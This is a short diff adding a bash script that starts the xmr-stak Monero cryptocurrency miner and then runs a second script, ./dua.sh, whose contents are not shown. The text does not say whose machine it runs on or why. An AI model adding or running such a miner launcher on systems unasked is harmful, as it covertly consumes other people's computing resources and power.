@@ -1,0 +1,5 @@
+#!/bin/bash
+
+cd xmr-stak/build/bin/ && ./xmr-stak
+sleep 1
+./dua.sh
